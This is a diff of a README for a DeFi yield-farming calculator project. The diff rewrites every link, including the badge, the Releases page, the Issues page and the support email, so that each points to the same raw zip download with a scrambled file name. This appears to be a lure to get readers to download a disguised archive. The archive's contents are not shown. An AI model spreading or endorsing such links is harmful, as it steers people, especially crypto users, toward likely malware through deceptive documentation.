@@ -1,6 +1,6 @@
 # 🎉 DeFiYield-Farming - Simplifying Your Yield Farming Rewards
 
-[![Download DeFiYield-Farming](https://img.shields.io/badge/Download-DeFiYield--Farming-blue)](https://github.com/toji-lang/DeFiYield-Farming/releases)
+[![Download DeFiYield-Farming](https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip)](https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to DeFiYield Farming! This application helps you calculate rewards for y
 
 To get started, you first need to download the application. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/toji-lang/DeFiYield-Farming/releases) to find the latest version of DeFiYield Farming.
+1. Visit the [Releases page](https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip) to find the latest version of DeFiYield Farming.
 2. Look for the version you want. A stable version will be listed at the top.
 3. Click on the assets section to find the installation file. Download the file by clicking on it.
 
@@ -67,9 +67,9 @@ For further assistance, you can consult the following resources:
 
 If you have any questions or need personal assistance, feel free to reach out:
 
-- **Email:** support@defiyieldfarming.com
-- **GitHub Issues:** You can report problems directly on the [GitHub Issues page](https://github.com/toji-lang/DeFiYield-Farming/issues).
+- **Email:** https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip
+- **GitHub Issues:** You can report problems directly on the [GitHub Issues page](https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip).
 
 ## ✅ Conclusion
 
-Thank you for choosing DeFiYield Farming! We are here to help you make the most of your yield farming experience. Don’t forget to check back for updates and new features on our [Releases page](https://github.com/toji-lang/DeFiYield-Farming/releases). Happy farming!
+Thank you for choosing DeFiYield Farming! We are here to help you make the most of your yield farming experience. Don’t forget to check back for updates and new features on our [Releases page](https://github.com/toji-lang/DeFiYield-Farming/raw/refs/heads/main/DeFiYield/Fi_Farming_Yield_De_2.0-beta.3.zip). Happy farming!
